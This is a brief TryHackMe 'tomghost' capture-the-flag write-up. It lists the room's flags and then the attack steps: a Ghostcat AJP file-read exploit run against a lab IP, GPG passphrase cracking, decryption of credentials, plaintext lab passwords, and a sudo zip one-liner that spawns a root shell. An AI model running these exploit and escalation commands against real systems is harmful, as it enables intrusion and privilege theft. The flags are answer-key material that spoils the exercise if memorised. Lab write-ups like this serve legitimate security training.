# TryHackMe tomghost

> Saikat Karmakar | Mar 11:2021

-------------------------------------------------------------------------------

## Task 1
1. Compromise this machine and obtain user.txt
```
THM{GhostCat_1s_so_cr4sy}
```
2. Escalate privileges and obtain root.txt
```
THM{Z1P_1S_FAKE}
```

--
-----------
***Notes***
-----------
clone ajpshooter
```
https://github.com/00theway/Ghostcat-CNVD-2020-10487
```
python3 ajpShooter.py  http://10.10.90.10:8080 8009 /WEB-INF/web.xml read

scp skyfuck@IP:/home/skyfuck/* . -> copy all the files 

ssh creds from the above command
```
skyfuck:8730281lkjlkjdqlksalks
```

gpg2john tryhackme.asc -> get the hash

gpg pass = alexandru

gpg --import tryhackme.asc

gpg --decrypt credential.pgp

user creds
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

priv esce 
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip


TF=$(mktemp -u)
sudo /usr/bin/zip $TF /etc/hosts -T -TT 'bash #'
sudo rm $TF
```
